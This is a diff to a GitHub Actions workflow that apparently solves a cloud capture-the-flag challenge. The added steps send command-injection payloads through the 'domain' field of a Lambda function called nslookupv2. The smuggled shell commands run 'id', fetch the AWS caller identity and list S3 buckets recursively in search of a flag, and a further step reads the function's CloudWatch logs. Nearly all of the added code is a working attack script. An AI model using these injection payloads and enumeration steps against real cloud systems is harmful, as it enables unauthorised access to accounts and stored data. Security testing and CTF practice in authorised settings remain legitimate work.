@@ -59,3 +59,60 @@ jobs:
 
           echo "== Flag grep =="
           grep -RInaE 'flag|ctf|HTB|THM|pico|faith|secret|password|token|key' out || true
+
+      - name: Probe command injection
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          invoke() {
+            local label="$1"
+            local payload="$2"
+            echo "== Invoke: $label =="
+            aws lambda invoke \
+              --function-name nslookupv2 \
+              --cli-binary-format raw-in-base64-out \
+              --payload "$payload" \
+              "out/${label}.response.json" || true
+            cat "out/${label}.response.json" || true
+            echo
+          }
+
+          mkdir -p out
+
+          invoke "id" '{"domain":"example.com; id; #"}'
+          invoke "caller" '{"domain":"example.com; /opt/aws sts get-caller-identity; aws sts get-caller-identity; python -m awscli sts get-caller-identity; #"}'
+          invoke "s3ls" '{"domain":"example.com; /opt/aws s3 ls; aws s3 ls; python -m awscli s3 ls; #"}'
+          invoke "findflag" '{"domain":"example.com; /opt/aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive; /opt/aws s3 ls s3://codec4f26c862a321ef5 --recursive; /opt/aws s3 ls s3://site781fe43f26b9eba3 --recursive; #"}'
+
+      - name: Try CloudWatch log read
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          log_group="/aws/lambda/nslookupv2"
+          echo "== Log streams =="
+          aws logs describe-log-streams \
+            --log-group-name "$log_group" \
+            --order-by LastEventTime \
+            --descending \
+            --max-items 5 \
+            --output json || true
+
+          stream="$(aws logs describe-log-streams \
+            --log-group-name "$log_group" \
+            --order-by LastEventTime \
+            --descending \
+            --max-items 1 \
+            --query 'logStreams[0].logStreamName' \
+            --output text 2>/dev/null || true)"
+
+          if [[ "$stream" != "None" && -n "$stream" ]]; then
+            echo "== Recent log events from $stream =="
+            aws logs get-log-events \
+              --log-group-name "$log_group" \
+              --log-stream-name "$stream" \
+              --limit 100 \
+              --query 'events[].message' \
+              --output text || true
+          fi
